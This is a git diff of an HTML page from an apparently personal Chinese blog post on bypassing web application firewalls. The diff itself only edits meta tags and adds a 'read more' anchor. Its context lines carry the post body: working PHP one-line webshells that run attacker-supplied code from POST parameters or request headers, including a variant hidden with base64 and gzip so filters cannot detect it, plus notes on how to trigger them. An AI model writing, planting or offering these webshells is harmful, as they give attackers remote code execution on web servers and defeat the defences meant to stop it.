@@ -93,17 +93,17 @@
 
 
 
-<meta name="description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用">
+<meta name="description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来">
 <meta name="keywords" content="waf,xss,sql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="bypass_waf">
 <meta property="og:url" content="http://Merl1ng.com/2017/07/20/bypass_waf/index.html">
 <meta property="og:site_name" content="Merl1ng">
-<meta property="og:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用">
-<meta property="og:updated_time" content="2017-07-24T07:04:22.402Z">
+<meta property="og:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来">
+<meta property="og:updated_time" content="2017-07-25T06:12:13.848Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bypass_waf">
-<meta name="twitter:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用">
+<meta name="twitter:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来">
 
 
 
@@ -352,8 +352,7 @@
       
 
       
-        <h3 id="一句话-bypass-waf"><a href="#一句话-bypass-waf" class="headerlink" title="一句话 bypass_waf"></a>一句话 bypass_waf</h3><p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马 看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来</p>
-<p>（也看到了一篇sql和xss绕waf的 挺不错的 记录在下面）</p>
+        <h3 id="一句话-bypass-waf"><a href="#一句话-bypass-waf" class="headerlink" title="一句话 bypass_waf"></a>一句话 bypass_waf</h3><p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马 看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来<br><a id="more"></a><br>（也看到了一篇sql和xss绕waf的 挺不错的 记录在下面）</p>
 <p>姿势一 php动态函数 （无eval）<br><code>&lt;?php $_POST[&#39;xx&#39;]($_POST[&#39;oo&#39;]);?&gt;</code><br>利用 在hackbar Post data<br>写入xx=assert￥oo=QAQ</p>
 <p>姿势二 无Post<br>getallheaders函数能够获取请求头内容<br><code>&lt;?php eval(getallheaders()[&#39;Accept-Language&#39;]);&gt;</code><br>结合姿势一<br><code>&lt;?php $a=getallheaders()[&#39;xxx&#39;];$a(getallheaders()[&#39;ooo&#39;]);&gt;</code></p>
 <p>姿势三 遇到会检测http请求头内容的waf<br><code>&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;])));&gt;</code><br>解开之后发现是乱码，waf识别不出来里面的内容<br>结合姿势一<br><code>&lt;?php $xx=gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;]));$xx(gzuncompress(base64_decode(getallheaders()[&#39;oo&#39;])));&gt;</code></p>
